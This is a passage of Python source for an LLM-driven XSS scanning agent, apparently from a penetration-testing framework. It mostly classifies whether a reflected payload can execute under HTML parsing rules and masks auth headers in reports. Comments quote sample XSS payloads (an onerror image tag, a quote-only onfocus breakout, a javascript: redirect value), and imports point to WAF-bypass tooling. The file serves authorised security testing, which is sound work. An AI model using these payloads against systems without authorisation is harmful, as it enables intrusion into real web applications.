"""
XSSAgent V3 - LLM-Driven with Multi-Layer Validation

This is a complete rewrite of the XSS detection agent using:
1. LLM as the brain (analyzes HTML, decides payloads)
2. Interactsh for OOB validation (definitive proof)
3. Vision LLM for visual validation (screenshot analysis)
4. CDP for DOM-based validation (fallback)

Author: BugtraceAI Team
Version: 3.0.0
Date: 2026-01-10
"""

import asyncio
import aiohttp
import json
from typing import Dict, Iterable, List, NamedTuple, Optional, Any, Tuple, Union
from pathlib import Path
from dataclasses import dataclass, field, asdict, is_dataclass
from enum import Enum
from bisect import bisect_right
from functools import lru_cache
from operator import itemgetter as _itemgetter
import html as html_module
import re
import urllib.parse
from bugtrace.schemas.validation_feedback import ValidationFeedback, FailureReason

from bugtrace.utils.logger import get_logger
from bugtrace.core.config import settings
from bugtrace.core.llm_client import llm_client
from bugtrace.core.ui import dashboard
from bugtrace.core.http_manager import http_manager, ConnectionProfile
from bugtrace.tools.interactsh import InteractshClient
from bugtrace.tools.visual.verifier import XSSVerifier
from bugtrace.memory.payload_learner import PayloadLearner
from bugtrace.tools.external import external_tools
from bugtrace.tools.headless import detect_dom_xss, detect_dom_xss_batch

# Import worker pool for queue consumption (Phase 19)
from bugtrace.agents.worker_pool import WorkerPool, WorkerConfig
from bugtrace.core.queue import queue_manager
from bugtrace.core.event_bus import EventType
from bugtrace.core.verbose_events import create_emitter

# Import framework's WAF intelligence (Q-Learning based)
from bugtrace.tools.waf import waf_fingerprinter, strategy_router, encoding_techniques

# Import reporting standards for consistent output
from bugtrace.reporting.standards import (
    get_cwe_for_vuln,
    get_remediation_for_vuln,
    normalize_severity,
    get_default_severity,
)
from bugtrace.core.validation_status import ValidationStatus, requires_cdp_validation, get_validation_status

# v2.1.0: Import specialist utilities for payload loading from JSON
from bugtrace.agents.specialist_utils import load_full_payload_from_json, load_full_finding_data

# v3.2.0: Import TechContextMixin for context-aware XSS detection
from bugtrace.agents.mixins.tech_context import TechContextMixin

# v3.1.0: Hybrid Engine imports (Go Fuzzer + Payload Amplification)
from bugtrace.utils.payload_amplifier import PayloadAmplifier
from bugtrace.tools.go_bridge import GoFuzzerBridge, FuzzResult, Reflection

# v3.3: ManipulatorOrchestrator for Python-only HTTP attack campaigns
from bugtrace.tools.manipulator.orchestrator import ManipulatorOrchestrator
from bugtrace.tools.manipulator.models import MutableRequest, MutationStrategy
# Context → breakout table lives in the manipulator (single source of truth); L3 reuses it
# instead of keeping a second copy of the same prefixes here.
from bugtrace.tools.manipulator.context_analyzer import ContextAnalyzer, ReflectionContext

# v3.4: Extracted pure modules
from bugtrace.agents.xss.waf import (
    detect_payload_encoding as _pure_detect_payload_encoding,
    record_bypass_result as _pure_record_bypass_result,
    get_waf_optimized_payloads as _pure_get_waf_optimized_payloads,
    bypass_try_waf_encoding as _pure_bypass_try_waf_encoding,
    bypass_try_char_obfuscation as _pure_bypass_try_char_obfuscation,
    bypass_try_context_specific as _pure_bypass_try_context_specific,
    bypass_try_universal_payloads as _pure_bypass_try_universal_payloads,
    generate_bypass_variant as _pure_generate_bypass_variant,
)
from bugtrace.agents.xss.feedback import (
    adapt_to_context as _pure_adapt_to_context,
    extract_js_code as _pure_extract_js_code,
    adapt_for_attribute as _pure_adapt_for_attribute,
    adapt_for_script as _pure_adapt_for_script,
    adapt_for_html as _pure_adapt_for_html,
    adapt_for_comment as _pure_adapt_for_comment,
    adapt_for_style as _pure_adapt_for_style,
    encode_stripped_chars as _pure_encode_stripped_chars,
    generate_csp_bypass_payload as _pure_generate_csp_bypass_payload,
    handle_waf_blocked as _pure_handle_waf_blocked,
    handle_context_mismatch as _pure_handle_context_mismatch,
    handle_encoding_stripped as _pure_handle_encoding_stripped,
    handle_partial_reflection as _pure_handle_partial_reflection,
    handle_csp_blocked as _pure_handle_csp_blocked,
    handle_timing_issue as _pure_handle_timing_issue,
    generate_variant_for_reason as _pure_generate_variant_for_reason,
)
from bugtrace.agents.xss import coverage as xss_coverage
from bugtrace.agents.xss.reporting import (
    get_snippet as _pure_get_snippet,
    save_phase1_report as _pure_save_phase1_report,
    save_phase2_report as _pure_save_phase2_report,
    save_phase3_report as _pure_save_phase3_report,
    save_phase4_report as _pure_save_phase4_report,
)

# Reuse the OpenRedirect parameter vocabulary (DRY) so browser-only XSS — redirect/DOM-sink
# params like back=javascript:... that fire only on a real click — auto-escalate to the
# browser even at 'standard' scan depth.
from bugtrace.agents.openredirect_payloads import REDIRECT_PARAMS

logger = get_logger("agents.xss_v4")

# Serializes CDP-based proof-screenshot fallbacks. Chrome DevTools Protocol is
# single-threaded, so concurrent CDP captures across parallel XSS agents would
# contend; Playwright captures (the common, multi-threaded path) are unaffected.
_CDP_PROOF_LOCK = asyncio.Lock()

# Browser-only XSS candidates can be confirmed ONLY in a real browser (a click / DOM
# execution), never by HTTP reflection — so they auto-escalate to L5/L6 regardless of scan
# depth. A redirect/DOM-sink parameter (value flows into an href/navigation) or a reflection
# that landed in one of these contexts qualifies.
# len>=3 drops noisy 1-2 char entries (u/r/l/q/to/go/rd) that would over-escalate common params.
_REDIRECT_PARAM_SET = frozenset(p.lower() for p in REDIRECT_PARAMS if len(p) >= 3)
_BROWSER_ONLY_CONTEXTS = frozenset({"href", "url_context", "dom_xss", "js_url"})

# The historical hardcoded reflection marker. `_analyze_reflection_context()` searches for
# THIS string unless a caller passes an explicit `marker=`, because four of its six call
# sites pass a full PAYLOAD as `probe_prefix` — see the docstring there.
_LEGACY_PROBE_MARKER = "BT7331"

# How much HTML around the reflection point is handed to the L3 LLM prompt. A window, not a
# budget: too small and the model cannot see the enclosing tag, too large and it pays for
# unrelated markup. The L1 caller truncates the result again to its own limit.
_REFLECTION_SNIPPET_RADIUS = 250

# The L0.5 char-survival probe. Each special char is bracketed by its own marker pair so its
# survival is measured independently of the others. Module-level so the coverage record can
# state WHAT WAS SENT without the caller re-deriving (or drifting from) the literal.
# Format: BT7331A"BT7331B'BT7331C<BT7331D>BT7331E`BT7331F\BT7331G
_L05_CHAR_PROBE = 'BT7331A"BT7331B\'BT7331C<BT7331D>BT7331E`BT7331F\\BT7331G'

# What the L0.5 probe observed. "no response" and "responded without the marker" are opposite
# facts — one is a broken/blocked target, the other is a parameter that is simply not
# injectable here — and reflects=False alone cannot tell them apart.
_PROBE_NO_RESPONSE = "no_response"
_PROBE_NO_REFLECTION = "no_reflection"
_PROBE_REFLECTED = "reflected"


# PURE
def _as_context_set(contexts: Union[str, Iterable[str], None]) -> frozenset:
    """Normalise one context label — or any iterable of labels — to a lowercase set.

    A reflection almost always has SEVERAL contexts at once (a search term echoed into an
    <a href>, into an <input value> and into the body). Consumers that must not lose any of
    them take the whole set; consumers that need a single label keep using
    most_exploitable_context(). Accepting a bare string keeps every existing caller valid.
    """
    if not contexts:
        return frozenset()
    if isinstance(contexts, str):
        contexts = (contexts,)
    return frozenset((c or "").lower() for c in contexts if c)


@dataclass
class InjectionContext:
    type: str
    code_snippet: str

class ValidationMethod(Enum):
    INTERACTSH = "interactsh"  # OOB callback - definitive
    VISION = "vision"          # Screenshot analysis
    CDP = "cdp"                # DOM marker check
    

@dataclass
class XSSFinding:
    """Represents a confirmed XSS vulnerability."""
    url: str
    parameter: str
    payload: str
    context: str
    validation_method: str
    evidence: Dict[str, Any]
    confidence: float
    type: str = "XSS"  # Required for report categorization
    status: str = "PENDING_VALIDATION"  # Tiered Validation Status
    validated: bool = False  # Authority flag for VALIDATED_CONFIRMED
    screenshot_path: Optional[str] = None
    reflection_context: Optional[str] = None # Reflection context (e.g. html_text, script)
    surviving_chars: Optional[str] = None    # Character survival metadata (e.g. < > ")
    successful_payloads: List[str] = None    # All working payloads for this parameter
    
    # IMPROVED REPORTING FIELDS (2026-01-24)
    xss_type: str = "reflected"
    injection_context_type: str = "unknown"
    vulnerable_code_snippet: str = ""
    server_escaping: Dict[str, bool] = field(default_factory=dict)
    escape_bypass_technique: str = "none"
    bypass_explanation: str = ""
    exploit_url: str = ""
    exploit_url_encoded: str = ""
    http_method: str = "GET"  # HTTP method used for exploitation (GET or POST)
    verification_methods: List[Dict] = field(default_factory=list)
    verification_warnings: List[str] = field(default_factory=list)
    reproduction_steps: List[str] = field(default_factory=list)


# --- Seed enrichment helpers: persist the REAL confirming request for the WEB AI Repeater ---
_SENSITIVE_HEADERS = ("authorization", "cookie", "x-csrf-token", "x-api-key", "x-auth-token", "x-session-token")


def _mask_auth_headers(headers: Dict[str, Any]) -> Dict[str, Any]:
    """Redact sensitive auth header VALUES (keep a short prefix) so secrets never reach
    the JSON files served (unauthenticated) by the report-file API. Records that auth
    was present without leaking it."""
    masked: Dict[str, Any] = {}
    for k, v in (headers or {}).items():
        if isinstance(k, str) and k.lower() in _SENSITIVE_HEADERS and isinstance(v, str) and v:
            masked[k] = f"{v[:6]}…<redacted>"
        else:
            masked[k] = v
    return masked


def _auth_meta(auth_headers: Dict[str, Any]) -> Dict[str, Any]:
    """Record that auth was used (scheme + masked token) without leaking the secret."""
    if not auth_headers:
        return {"auth_used": False, "auth_role": None, "auth_scheme": "none", "auth_token_masked": None}
    scheme, token = "header", None
    for k, v in auth_headers.items():
        if not isinstance(v, str) or not v:
            continue
        kl = k.lower()
        if kl == "authorization":
            scheme = v.split(" ", 1)[0] if " " in v else "Bearer"
            token = f"{v[:8]}…<redacted>"
            break
        if kl == "cookie":
            scheme = "Cookie"
            token = f"{v[:8]}…<redacted>"
            break
    return {"auth_used": True, "auth_role": "user", "auth_scheme": scheme, "auth_token_masked": token}


def _excerpt_around(text: str, marker: str, radius: int = 2000) -> str:
    """Return ~radius chars centered on the payload reflection (not from byte 0), capped."""
    if not text:
        return ""
    idx = text.find(marker) if marker else -1
    if idx < 0 and marker:
        for token in (marker[:24], "BTXSS", "BUGTRACE"):
            if token:
                j = text.find(token)
                if j >= 0:
                    idx = j
                    break
    if idx < 0:
        return text[: radius * 2]
    start = max(0, idx - radius)
    end = min(len(text), idx + len(marker or "") + radius)
    return text[start:end]


def _build_raw_http(req: Dict[str, Any]) -> str:
    """Render a captured request dict as a raw HTTP request string (for the report)."""
    from urllib.parse import urlparse
    method = req.get("method", "GET")
    p = urlparse(req.get("url", "") or "")
    path = (p.path or "/") + (("?" + p.query) if p.query else "")
    lines = [f"{method} {path} HTTP/1.1"]
    headers = dict(req.get("headers") or {})
    if p.netloc and not any(isinstance(h, str) and h.lower() == "host" for h in headers):
        lines.append(f"Host: {p.netloc}")
    for k, v in headers.items():
        lines.append(f"{k}: {v}")
    body = req.get("body") or ""
    return "\n".join(lines) + "\n\n" + body


def _promote_repro(d: Dict[str, Any]) -> Dict[str, Any]:
    """Ensure an XSS finding dict exposes a TOP-LEVEL `repro` + `http_request`.

    The escalation pipeline serializes XSSFinding via asdict(), which leaves the
    confirming request inside `evidence` only — so the WEB AI Repeater / API never
    see it. Promote it here (auth was already masked at capture by _stamp_repro).
    Idempotent: findings that already carry `repro` (stored-XSS / _finding_to_dict)
    are returned untouched. `repro` is never left null — reconstructed from the
    finding's own data as a last resort.
    """
    if not isinstance(d, dict) or d.get("repro"):
        return d
    ev = d.get("evidence") or {}
    cr = ev.get("confirming_request") if isinstance(ev, dict) else None
    capture = ev.get("capture_method") if isinstance(ev, dict) else None
    if not cr:
        method = str(d.get("http_method") or d.get("method") or "GET").upper()
        url = d.get("url") or ""
        param = d.get("parameter") or ""
        payload = d.get("payload") or ""
        if method == "POST":
            cr = {"method": "POST", "url": url, "headers": {},
                  "body": f"{param}={payload}", "body_content_type": "application/x-www-form-urlencoded"}
        else:
            try:
                from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
                p = urlparse(url)
                qs = parse_qs(p.query)
                if param:
                    qs[param] = [payload]
                url = urlunparse((p.scheme, p.netloc, p.path, '', urlencode(qs, doseq=True), ''))
            except Exception:
                pass
            cr = {"method": "GET", "url": url, "headers": {}, "body": None, "body_content_type": None}
        capture = "reconstructed_from_finding"
    d["repro"] = {
        "confirming_request": cr,
        "confirming_response": ev.get("confirming_response") if isinstance(ev, dict) else None,
        "readback_request": ev.get("readback_request") if isinstance(ev, dict) else None,
        "auth": ev.get("repro_auth") if isinstance(ev, dict) else None,
        "capture_method": capture,
    }
    if not d.get("http_request"):
        try:
            d["http_request"] = _build_raw_http(cr)
        except Exception:
            pass
    return d


# =============================================================================
# REFLECTION POSITION CLASSIFICATION (PURE)
# =============================================================================
# HTML standard: the content of these elements is parsed as RCDATA/RAWTEXT — markup
# inside them is NOT tokenized as tags. A payload reflected there is inert text unless it
# carries the matching close tag. This is the HTML spec element set, not a heuristic
# keyword list.
_RAW_TEXT_ELEMENTS = frozenset({
    "script", "style", "title", "textarea", "noscript", "xmp",
    "iframe", "noembed", "noframes",
})

# The RCDATA half of that set (character references still resolve, markup does not).
# Only used to label the region: both halves need the appropriate end tag to escape.
_RCDATA_ELEMENTS = frozenset({"title", "textarea"})

# Positions where the HTML tokenizer PROVES the payload cannot be parsed as markup.
# Every other label — including anything unrecognised — counts as executable: we fail
# OPEN, because a false positive is recoverable but a silently dropped vulnerability is not.
_INERT_REFLECTION_POSITIONS = frozenset({
    "rawtext_inert", "attribute_quoted_inert", "comment_inert", "script_js_inert",
    # HTML standard, "the template element": the contents of a <template> are parsed into
    # a SEPARATE document that is never rendered, so nothing in it loads, fires or runs.
    "template_inert",
    # HTML tree construction, "after frameset" insertion mode: in a frameset document the
    # <body> and everything else outside the frameset is dropped on the floor.
    "frameset_inert",
    # ECMAScript: an inline classic script that does not PARSE is discarded whole, so the
    # code the payload smuggled in never runs either.
    "script_js_syntax_error",
})

# Positions that are re-parsed as DOCUMENT TEXT: whatever the payload does there, it has
# to open a tag, so it needs both angle brackets. (A breakout label lands here too: once
# the payload has closed the raw-text element / the comment, it is back in text.)
_TEXT_REFLECTION_POSITIONS = frozenset({
    "html_text", "rawtext_breakout", "comment_breakout",
})

# Positions that are re-parsed INSIDE A START TAG: the payload does not need angle
# brackets there, it only has to declare one more attribute. HTML defines event handler
# content attributes as the `on<eventname>` family (HTML "event handlers" section), so
# that shape — not a list of individual handler names — is what proves execution.
_TAG_REFLECTION_POSITIONS = frozenset({
    "attribute_unquoted", "attribute_quoted_breakout",
})
_EVENT_HANDLER_ATTR_RE = re.compile(r"(?:^|[\s\"'/])(on[a-z]+)\s*=", re.IGNORECASE)
# A '<' only opens a tag when an ASCII letter follows it (HTML tokenizer, tag open state).
# '</' opens an END tag, which creates nothing.
_TAG_OPEN_RE = re.compile(r"<[a-zA-Z]")

# HTML "load"/"error" events are fired by the RESOURCE FETCH processing model, so they
# only ever reach an element that actually fetches something. `onerror` smuggled onto a
# <div>/<input type=text> is a dead handler — this is the difference between the corpus'
# `<img src=x alt=PAYLOAD>` (fires) and `<input value=PAYLOAD>` (does not).
_RESOURCE_EVENTS = frozenset({"onerror", "onload"})

# Element-state suffix: the tokenizer records `<input type=hidden>` as "input\x00hidden".
# NUL cannot occur in a real tag name (the tokenizer replaces it with U+FFFD), so the
# compound name can never collide with an element the page actually contains.
_ELEMENT_STATE_SEP = "\x00"

_RESOURCE_LOADING_ELEMENTS = frozenset({
    "img", "image", "script", "link", "style", "iframe", "frame", "embed", "object",
    "source", "track", "video", "audio", "body", "frameset", "applet", "bgsound",
    "input" + _ELEMENT_STATE_SEP + "image",
})

# Elements that are never rendered, so NO user-triggerable event can reach them and no
# resource fetch can fail on them. `<input type=hidden>` is the one that matters: hidden
# fields are the single commonest reflection sink on ordinary sites, and the product's own
# no-angle-bracket bypass (`" autofocus onfocus=...`) is dead on them.
_NOT_RENDERED_ELEMENTS = frozenset({"input" + _ELEMENT_STATE_SEP + "hidden"})

# HTML "focus"/"blur" are dispatched at the FOCUSABLE AREA that gains or loses focus and
# do NOT bubble, so a handler for them only ever runs on an element that can be focused in
# the first place. `onfocus autofocus` smuggled onto a <div>/<span>/<td> is a dead handler
# — which is what the product's own no-angle-bracket bypass lands on whenever the server
# encodes '<' and '>' but lets '"' through.
# `focusin`/`focusout` are deliberately NOT here: those two DO bubble, so a focusable
# DESCENDANT reaches them, and whether the element has one is not a fact about its start
# tag. Unknowable ⇒ fail OPEN.
_NON_BUBBLING_FOCUS_EVENTS = frozenset({"onfocus", "onblur"})

# HTML standard, "focusable area": what is focusable WITHOUT the author asking for it.
# `object`/`embed`/`body`/`frameset`/`html` are in here as a FAIL OPEN rather than as a
# claim — an <embed>/<object> becomes focusable once it renders its content, and a
# <body>/<frameset> FORWARDS its focus handler to the Window (HTML, "window-reflecting
# body element event handler set"), so window activation fires it. Neither is decidable
# from the response body, and a missed false positive costs less than a lost finding.
_FOCUSABLE_ELEMENTS = frozenset({
    "button", "select", "textarea", "input", "summary",
    "iframe", "frame", "object", "embed", "body", "frameset", "html",
})

# ... and the elements that only become focusable areas when they carry one of a set of
# attributes: a hyperlink needs its href, a media element needs the controls UI to put a
# control in the focus order. (<a> without href and <audio> without controls are
# measurably inert.) `xlink:href` is the SVG 1.1 spelling of the same hyperlink and is
# what an <svg><a> in the wild actually carries.
_FOCUSABLE_WITH_ATTRIBUTE = {
    "a": ("href", "xlink:href"), "area": ("href", "xlink:href"),
    "audio": ("controls",), "video": ("controls",),
}

# Attributes that make ANY element a focusable area: `tabindex` puts it in the sequential
# focus navigation order, `contenteditable` makes it an editing host.
_UNIVERSAL_FOCUS_ATTRIBUTES = ("tabindex", "contenteditable")

# HTML, "focusable area": a form control whose `disabled` attribute is set is excluded by
# definition, and no tabindex buys it back (measured: <input disabled tabindex=0> takes no
# focus in Chromium, while <div disabled tabindex=0> does — `disabled` is only DEFINED on
# these elements, so the attribute on its own decides nothing).
# The one hatch is a script that later removes the attribute. It is left closed because
# the browser this agent hands its findings to is the same one measured here: a payload
# that cannot fire in Chromium cannot be visually validated either, so confirming it
# produces a report nobody can reproduce.
_DISABLEABLE_ELEMENTS = frozenset({
    "button", "input", "select", "textarea", "optgroup", "option", "fieldset",
})

# HTML Standard, "Index of elements", plus the obsolete names the parser still knows. A
# name OUTSIDE this index is a foreign (SVG / MathML) or custom element, and for those
# "is it a focusable area" is NOT a fact about the name: Chromium takes focus on every
# RENDERED SVG element — <svg> itself, g, rect, circle, text, image, and <a> with no href
# at all — with no tabindex anywhere. Unknown name ⇒ unknown focusability ⇒ FAIL OPEN.
#
# `image` is deliberately ABSENT: it is a rendered (therefore focusable) SVG element, and
# in HTML content the parser rewrites <image> to <img>, so leaving it out costs nothing.
# The names that ARE shared with SVG — a, script, style, title, font — are kept because
# their SVG counterparts are measurably unfocusable, EXCEPT svg:a, whose focusability
# without an href is the one case this set gets wrong (see _element_is_focusable).
_HTML_ELEMENTS = frozenset({
    "a", "abbr", "address", "area", "article", "aside", "audio", "b", "base", "bdi",
    "bdo", "blockquote", "body", "br", "button", "canvas", "caption", "cite", "code",
    "col", "colgroup", "data", "datalist", "dd", "del", "details", "dfn", "dialog",
    "div", "dl", "dt", "em", "embed", "fieldset", "figcaption", "figure", "footer",
    "form", "h1", "h2", "h3", "h4", "h5", "h6", "head", "header", "hgroup", "hr",
    "html", "i", "iframe", "img", "input", "ins", "kbd", "label", "legend", "li",
    "link", "main", "map", "mark", "menu", "meta", "meter", "nav", "noscript",
    "object", "ol", "optgroup", "option", "output", "p", "picture", "pre", "progress",
    "q", "rp", "rt", "ruby", "s", "samp", "script", "search", "section", "select",
    "slot", "small", "source", "span", "strong", "style", "sub", "summary", "sup",
    "table", "tbody", "td", "template", "textarea", "tfoot", "th", "thead", "time",
    "title", "tr", "track", "u", "ul", "var", "video", "wbr",
    # obsolete, but the HTML parser still builds them and none is ever focusable
    "acronym", "applet", "basefont", "bgsound", "big", "blink", "center", "dir",
    "font", "frame", "frameset", "isindex", "keygen", "listing", "marquee",
    "menuitem", "nobr", "noembed", "noframes", "param", "plaintext", "rb", "rtc",
    "spacer", "strike", "tt", "xmp",
})

# Attribute-name lookups on a start tag's name text, compiled once per attribute name.
_ATTR_NAME_RE_CACHE: Dict[str, "re.Pattern[str]"] = {}


# PURE
def _has_attribute(host: str, name: str) -> bool:
    """True when the start-tag name text `host` really declares the attribute `name`.

    A plain substring test is not enough HERE because the answer is used to REJECT: an
    `aria-disabled="true"` (which leaves the control perfectly focusable) or a
    `data-disabled` would otherwise read as `disabled` and delete a real finding. The
    delimiters are the ones the tokenizer can put around an attribute name — whitespace,
    '/', '=' and the tag's own '<'/'>'.

    The focus-GRANTING attributes deliberately keep the looser substring test: there a
    spurious match answers "focusable", which fails OPEN.
    """
    pattern = _ATTR_NAME_RE_CACHE.get(name)
    if pattern is None:
        pattern = re.compile(r"(?:^|[\s/<])" + re.escape(name) + r"(?=[\s/=>]|$)",
                             re.IGNORECASE)
        _ATTR_NAME_RE_CACHE[name] = pattern
    return pattern.search(host) is not None


# PURE
def _element_name(tag: str) -> str:
    """The bare element name of a tokenizer tag label ("input\\x00hidden" -> "input")."""
    if _ELEMENT_STATE_SEP in tag:
        return tag.split(_ELEMENT_STATE_SEP, 1)[0]
    return tag


# PURE
def _payload_opens_element(text: str, tail_closes: bool = False) -> bool:
    """True when `text`, parsed as document text, creates an element.

    Not ``'<' in text and '>' in text``: `</script>` and `a < b > c` contain both and
    create nothing. The HTML tokenizer only leaves the data state for a '<' followed by an
    ASCII letter, and the element only exists once a '>' closes its tag.

    That '>' does not have to be in the payload. Once the tokenizer is inside a tag it
    stays there, eating the document as attribute names, until the NEXT '>' anywhere —
    which is why `<div><img src=x onerror=alert(1) </div>` really does build an <img>,
    while the same fragment written at the very end of the document builds nothing.
    `tail_closes` is that fact about the rest of the response.
    """
    m = _TAG_OPEN_RE.search(text)
    if m is None:
        return False
    return tail_closes or text.find(">", m.end()) != -1


# PURE
def _payload_escapes_tag(text: str, tail_closes: bool = False) -> bool:
    """True when `text`, injected INSIDE a start tag, gets back out and opens an element.

    Everything before the payload's first '>' is still attributes of the element the
    server wrote; only what follows that '>' is document text again.
    """
    gt = text.find(">")
    return gt != -1 and _payload_opens_element(text[gt + 1:], tail_closes)


# PURE
def _element_is_focusable(tag: str, host: str) -> bool:
    """True when element `tag`, carrying the attribute names `host`, is a focusable area.

    `host` is the ATTRIBUTE-NAME text of the element's start tag (see
    _host_attribute_names) — the element's own name plus every attribute name the
    tokenizer read on it, WHOEVER wrote them: a `tabindex` the payload smuggled in is as
    real to the browser as one the server printed.

    Fails OPEN when either input is unknown. Everything else follows the HTML standard's
    definition of a focusable area: an author attribute that focuses any element, the
    elements that are focusable on their own, and the ones whose focusability is
    conditional on an attribute of theirs.

    KNOWN LIMITATION, measured and left open on purpose: focusability is
    (name x attributes x ANCESTOR) and only the first two are in a start tag. A <summary>
    is focusable inside a <details> and inert on its own, and an <a> with no href is inert
    in HTML content but focusable inside an <svg>. Both are resolved the fail-OPEN way for
    <summary> (kept in _FOCUSABLE_ELEMENTS) and the fail-CLOSED way for <a> (an hrefless
    <a> is an ordinary page element, an hrefless svg:a is not a thing sites ship), so
    svg:a is the one shape this predicate is knowingly wrong about.
    """
    if not tag or not host:
        return True  # unknown element or unknown attributes → fail OPEN
    if tag in _NOT_RENDERED_ELEMENTS:
        return False  # not rendered: nothing focuses it, tabindex included
    name = _element_name(tag)
    if name not in _HTML_ELEMENTS:
        return True  # foreign / custom element: focusability is not in the name → OPEN
    if name in _DISABLEABLE_ELEMENTS and _has_attribute(host, "disabled"):
        return False  # a disabled form control is not a focusable area, tabindex or not
    if any(attr in host for attr in _UNIVERSAL_FOCUS_ATTRIBUTES):
        return True
    if name in _FOCUSABLE_ELEMENTS:
        return True
    required = _FOCUSABLE_WITH_ATTRIBUTE.get(name)
    return required is not None and any(attr in host for attr in required)


# PURE
def _payload_handler_fires(text: str, tag: str, host: str = "") -> bool:
    """True when an event handler `text` declares can actually fire on element `tag`.

    Fails OPEN on an unknown element and on any handler outside the families whose firing
    conditions the HTML standard pins down exactly: the resource load/error events, the
    non-bubbling focus events, and "the element is not rendered at all". Mouse and
    keyboard handlers on an ordinary rendered element keep counting as execution, which is
    what the product's quote-only attribute bypass depends on.

    The two element-dependent families are the same fact seen twice — a handler whose
    event is only ever dispatched at an element of a certain kind is dead everywhere else.
    `onerror` needs an element that FETCHES; `onfocus` needs one that can be FOCUSED.

    `host` is the owning start tag's attribute-name text, needed because focusability is
    an attribute-level property; "" means it was not available and the focus check fails
    OPEN rather than guessing.
    """
    names = {m.lower() for m in _EVENT_HANDLER_ATTR_RE.findall(text)}
    if not names:
        return False
    if tag and tag in _NOT_RENDERED_ELEMENTS:
        return False
    if (tag and names <= _RESOURCE_EVENTS
            and tag not in _RESOURCE_LOADING_ELEMENTS
            and _element_name(tag) not in _RESOURCE_LOADING_ELEMENTS):
        return False
    if (tag and names <= _NON_BUBBLING_FOCUS_EVENTS
            and not _element_is_focusable(tag, host)):
        return False
    return True


# PURE
def _position_executes(position: str, payload: str, tag: str = "",
                       tail_closes: bool = True, host: str = "") -> bool:
    """True when a payload reflected at `position` can actually reach the JS engine.

    Replaces the blanket ``'<' in payload and '>' in payload`` gate that used to run
    BEFORE the classifier and threw its answer away. That gate encoded "XSS means
    injecting a tag", which is false for every target that filters angle brackets — and
    the product ships quote-only attribute breakouts (``" autofocus onfocus=...``) as its
    bypass for exactly that filter. The requirement now applies ONLY where the payload
    really is re-parsed as document text.

    `tag` is the element that OWNS the injection point (empty when unknown) and `host` is
    that element's start-tag attribute names. Inside a start tag the payload has exactly
    two ways out, and both are element-dependent: leave the tag and open an element of its
    own, or declare a handler the owning element can actually fire.

    Unknown labels return True: fail OPEN, a silent drop is not recoverable.
    """
    if position in _INERT_REFLECTION_POSITIONS:
        return False
    if position in _TEXT_REFLECTION_POSITIONS:
        return _payload_opens_element(payload, tail_closes)
    if position in _TAG_REFLECTION_POSITIONS:
        return (_payload_escapes_tag(payload, tail_closes)
                or _payload_handler_fires(payload, tag, host))
    return True


# HTML "foreign content" roots. Inside an <svg>/<math> subtree the RCDATA/RAWTEXT rule
# does NOT apply: svg:style is an ordinary foreign element, not raw text.
_FOREIGN_ROOTS = frozenset({"svg", "math"})

# HTML tree construction, "any other start tag" in foreign content: these HTML elements
# force the parser back OUT of the foreign subtree, so anything after them is HTML again.
_FOREIGN_BREAKOUT_ELEMENTS = frozenset({
    "b", "big", "blockquote", "body", "br", "center", "code", "dd", "div", "dl", "dt",
    "em", "embed", "h1", "h2", "h3", "h4", "h5", "h6", "head", "hr", "i", "img", "li",
    "listing", "menu", "meta", "nobr", "ol", "p", "pre", "ruby", "s", "small", "span",
    "strong", "strike", "sub", "sup", "table", "tt", "u", "ul", "var", "font",
})

# HTML tree construction, "HTML integration point" / "MathML text integration point":
# the CONTENT of these foreign elements is parsed with the ordinary HTML rules, so the
# RCDATA/RAWTEXT elements inside them are raw text again (<svg><foreignObject><textarea>
# really is an inert textarea).
_SVG_INTEGRATION_POINTS = frozenset({"foreignobject", "desc", "title"})
_MATHML_INTEGRATION_POINTS = frozenset({"mi", "mo", "mn", "ms", "mtext"})

# Region kinds a payload can open with its own first character: '<' opens a tag / comment
# / CDATA section, and a quote closes the attribute value the payload was injected into
# (which starts a fresh "tag" run). Everything else is server-written context.
_PAYLOAD_OPENED_KINDS = frozenset({"tag", "comment", "cdata"})

# Whitespace per the HTML tokenizer (NOT str.isspace(): no vertical tab, no NBSP).
_HTML_SPACE = " \t\n\f\r"

# ---------------------------------------------------------------------------
# HTML REGION LAYOUT
# ---------------------------------------------------------------------------
# A region is one contiguous run of the document that shares a single tokenizer state.
# It is a PLAIN TUPLE, not a NamedTuple, and that is a cost decision, not a style one:
# a 200 KB page produces ~25k regions and namedtuple.__new__ is a Python-level call, so
# the class cost ~7 ms per classification — on a layer whose entire reason to exist is
# being cheap enough to run before the Playwright screenshot. Field order:
#
#   [0] start  first offset covered
#   [1] end    one past the last offset covered
#   [2] kind   data | rcdata | rawtext | plaintext | comment | cdata
#              | tag (tag name / attribute name / after-attribute-value)
#              | attr_unquoted | attr_value (quoted)
#   [3] tag    element name owning the region ("" when unknown)
#   [4] attr   attribute name (attr_value / attr_unquoted regions only)
#
# The old `quote` and `foreign` fields are gone: both were written on every region and
# read by nobody.
_R_START, _R_END, _R_KIND, _R_TAG, _R_ATTR = 0, 1, 2, 3, 4

_HtmlRegion = Tuple[int, int, str, str, str]

# Scanning primitives. Every one of these replaces a per-character Python loop with a
# single C-level engine call — the tokenizer walks tags, not bytes.
#
# A markup start is '<' followed by '!' or '?' (doctype / PI / comment / CDATA) or by an
# optional '/' and an ASCII letter (a tag name). Any other '<' is literal text ("a < b"),
# exactly as the HTML tokenizer treats it. Group 1 is the element name, so finding the
# markup and reading its name is a single engine call.
_MARKUP_RE = re.compile(r"<(?:[!?]|/?([a-zA-Z][^ \t\n\f\r/=>]*))")
# One step inside a start/end tag: '>' | '/' | name [ '=' value-start ].
# Group 1 '>', group 2 '/', group 3 name, group 4 the '=' with its surrounding space,
# group 5 the opening quote OR the whole unquoted value.
_TAG_STEP_RE = re.compile(
    r"[ \t\n\f\r]*"
    r"(?:(>)|(/)|([^ \t\n\f\r/=>]*)(?:([ \t\n\f\r]*=[ \t\n\f\r]*)([\"']|[^ \t\n\f\r>]*))?)"
)
# Both comment terminators in ONE scan. Searching for "-->" and "--!>" separately meant
# every comment whose text lacked "--!>" scanned the whole rest of the document for it,
# which is quadratic in the page size — the same shape as the gospider JS-mining blow-up.
_COMMENT_END_RE = re.compile(r"--!?>")
# A <script> element cannot exist in a body that never opens one — the cheapest possible
# way to skip tokenizing the document for the inline-script check.
_SCRIPT_OPEN_RE = re.compile(r"<script", re.IGNORECASE)

# The two region kinds that hold an attribute VALUE.
_ATTR_VALUE_KINDS = ("attr_value", "attr_unquoted")

# Every region kind a START TAG is made of: the name / attribute-name runs plus the two
# value kinds. A tag's regions are emitted gap-free, so this is what makes "walk out to
